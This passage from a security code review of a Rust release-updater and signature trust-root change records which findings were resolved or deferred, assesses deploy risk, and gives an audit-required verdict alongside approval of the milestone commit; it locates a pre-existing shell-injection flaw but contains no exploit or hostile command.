| **F4** non-atomic `save` + fatal `load` can brick a node | Major | **RESOLVED** | `maintainer.rs:239-256` temp → `sync_all` → `rename`, both failure branches clean up (§5). Residual mode side effect ⇒ new **[F4]** |
| **F5** `specs/protocol.md` §10.2 specifies the deleted fail-open algorithm | Major | **RESOLVED** | §10.2 rewritten: resolution table, distinct-signer loop, `root.threshold()` "NOT a hardcoded 3", new artifact-binding subsection. One stale line elsewhere ⇒ new **[F5]** |
| **F6** `SKILL.md` contradicts itself about a bootstrap fallback | Major | **RESOLVED** | `SKILL.md:493` rewritten; `:159` corrected to `Result<usize>` and documents F10 |
| **F7** commit cannot be staged by path | Major | **OUT OF SCOPE** (runner handles; files staged whole and disclosed in the commit message) | — |
| **F8** two protection mechanisms unregistered | Major | **RESOLVED** (by runner) | `sqlite3 .omega/memory.db "SELECT * FROM v_protection_surface;"` returns PM-172-01 and PM-172-02, both carrying the interaction hazard and scale assumptions |
| **F9** regression tests assert wiring order, not the property | Minor | **RESOLVED** | `inc_i_172_install_gate_binding.rs` + `inc_i_172_apply_update_gate.rs` evaluate real functions on real signatures, with negative controls (§2) |
| **F10** case-sensitive public-key comparison | Minor | **RESOLVED** | `verification.rs:106` `eq_ignore_ascii_case` |
| **F11** magic-aliasing comment cites the wrong magnitude | Minor | **RESOLVED** | `maintainer.rs:32-33` now "1,414,745,412 (`0x54534D44`) — about 1.41 billion" |
| **F12** dead `get_maintainer_keys`, inert `UpdateParams` fields | Minor | **DEFERRED** to M2 by contract §10 | — |
| **F13** wiped `maintainer_state.bin` silently re-arms the leaked constants | Minor | **RESOLVED** | `trust_root_wiring.rs:87-95` `warn!` with the `TRUST_ROOT_BOOTSTRAP:` grep anchor naming the wipe case |
| **S1** `try_read()` contention returns an OnChain root for a Bootstrap node | Speculative | **NOT ADDRESSED** — unchanged at `trust_root_wiring.rs:151-164`; still fail-closed, still a provenance inaccuracy. Carry to M2 | — |

Blocking pass-1 findings: 6 raised, 5 resolved in code, 1 (F7) handled by the runner
outside the code. None remain open.

## 11. Residual risk on a rolling deploy

1. **The F4 deploy-day risk is closed.** The migration write is atomic, so the one
   fleet-wide non-atomic write that pass 1 flagged can no longer produce the zero-byte file
   that `load` treats as fatal.
2. **The operator escape hatch is now genuinely protected.** Both `doli upgrade` and
   `doli-node upgrade` bind signature to artifact, and the node command uses the on-chain
   root. What remains is [F2]: a compromised origin can still choose among genuine signed
   releases newer than the running one.
3. **[F1] is orthogonal to the deploy and predates it.** It needs a hostile local process
   and an operator upgrade; it is not made better or worse by shipping M1.
4. **Mixed-version fleet behaviour is unchanged from pass 1 and benign.** No block content,
   no consensus rule, no wire format, no gossiped structure. No activation height in the
   diff; `MAINTAINER_STATE_VERSION` is node-local and documented as such
   (`maintainer.rs:49-52`).
5. **Recommended before deploy, not before commit:** open an incident for [F1] and treat it
   as the next unit of work on this command.

## 12. Verdicts

━━━ SECURITY AUDIT VERDICT ━━━
Verdict: AUDIT-REQUIRED
Signals: signature-verification trust root (`crates/updater/src/{trust_root,verification,install_gate}.rs`); five binary-install authorization paths (`bins/cli/src/cmd_upgrade.rs`, `bins/node/src/commands/{misc,update}.rs`, `bins/node/src/updater/service.rs`, `crates/updater/src/apply.rs`); external data ingestion (`SIGNATURES.json`, `CHECKSUMS.txt`, GitHub release metadata from an attacker-reachable origin); a persisted security-relevant file format with a migration decoder and a rewritten write path (`crates/storage/src/maintainer.rs`); enforcement and deploy surface (the code that decides which binary every node in the fleet runs); a shell-interpolation sink reachable as root in the same command (`bins/cli/src/upgrade_restart.rs:293`)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

The pass-1 AUDIT-REQUIRED verdict STANDS, and the pass-2 evidence strengthens it. The
remediation did not shrink the security surface — it enlarged it: a new module
(`install_gate.rs`) now sits on the authorization path for two commands, `apply_update`
changed signature and download route, the maintainer-state write path was rewritten, and
`cmd_upgrade.rs` was split into two files. Every one of the seven signal rows is hit,
including the enforcement/deploy row most directly: the artifact under review IS the
mechanism that authorises what every node runs. The decisive evidence is [F1] pass-2 — a
root shell-injection sink that survived pass 1, a PASS QA report, a green build, green
clippy and 86 green test suites, and was found only by grepping the diff surface for
`Command::new`. A single-reviewer pass has now demonstrably missed a Critical defect twice
in this milestone. The 5-auditor sweep must run before this reaches mainnet.

**REVIEW VERDICT: APPROVED**

Approved for the M1 milestone commit. All six pass-1 blocking findings are closed — five in
code, verified link by link against the source rather than against the dev notes, and one
(F7) by the runner. The full gate is green on this working tree: `cargo build --release`,
`cargo clippy --workspace --all-targets -- -D warnings`, `cargo fmt --check`, and both test
invocations, 86 suites total, 0 failed.

None of the seven pass-2 findings blocks the commit:

- **[F1]** is Critical but PRE-EXISTING and byte-identical after the change — proven by
  `diff` against `HEAD:bins/cli/src/cmd_upgrade.rs`. M1 neither introduces nor worsens it.
  Blocking on it would hold a strictly-larger security win out of the tree while leaving
  the vector live either way. It requires its OWN incident, opened immediately.
- **[F2] [F3] [F4] [F6] [F7]** are Minor hardening and hygiene items with no reachable
  exploit given the fixes that landed.
- **[F5]** is a one-line documentation survivor.
- **[S1]** is speculative and inherited unchanged from pass 1.

The engineering in this remediation is strong. `verify_release_artifact` is the right
shape — one function, four explicit links, every operand re-derived from a single verified
byte buffer, no advisory outcome — and the behavioural test that backs it carries real
negative controls instead of asserting source text, which is a direct and correct answer to
pass-1 F9. Making `&TrustRoot` a required parameter of `apply_update` rather than an
optional one is the structural fix, not the convenient one. The milestone now does what it
claimed: the leaked compiled constants are no longer authoritative on any path where the
host holds an on-chain set, and no path installs a binary the maintainers did not sign for
that exact release.

Carry forward to M2 or to new incidents: [F1] (new incident, Critical), [F2], [F3], [F4],
[F5], [F6], [F7], [S1], and pass-1 [F12].
